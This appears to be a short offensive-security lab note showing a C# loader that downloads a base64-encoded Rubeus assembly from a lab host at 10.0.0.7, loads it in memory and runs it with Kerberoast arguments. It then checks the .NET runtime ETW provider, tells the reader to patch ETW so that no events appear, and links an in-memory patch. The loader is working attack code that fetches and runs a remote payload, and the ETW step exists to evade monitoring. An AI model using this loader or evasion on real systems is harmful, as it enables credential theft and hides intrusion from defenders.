# Lab - .NET Loader

```csharp
using System;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

public class RubeusLoader
{
    public static async Task Main(string[] args)
    {
        string url = "http://10.0.0.7:9090/Rubeus.b64";
        try
        {
            using (HttpClient client = new HttpClient())
            {
                byte[] assemblyBytes = Convert.FromBase64String(await client.GetStringAsync(url));
                Console.WriteLine("[+] Downloaded B64 .net assembly into a string...");
                Console.WriteLine("Press Any Key load assembly into memory...");
                Console.ReadKey();
                Assembly loadedAssembly = Assembly.Load(assemblyBytes);
                Console.WriteLine("[+] loaded assembly into a memory...");
                Console.WriteLine("Press Any Key execute assembly...");
                Console.ReadKey();
                loadedAssembly.GetType("Rubeus.Program")?.GetMethod("Main", BindingFlags.Public | BindingFlags.Static)?.Invoke(null, new object[] { new string[] { "kerberoast", "/stats" } });
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine($"Error: {e.Message}");
            if (e.InnerException != null) Console.Error.WriteLine($"Inner Exception: {e.InnerException.Message}");
        }
    }
}
```

```powershell
logman query providers dotnet-runtime
```

show event trace, then patch ETW, check again - no events should be there

>
> <https://github.com/nullsection/SharpETW-Patch/blob/main/PatchInMemory.cs>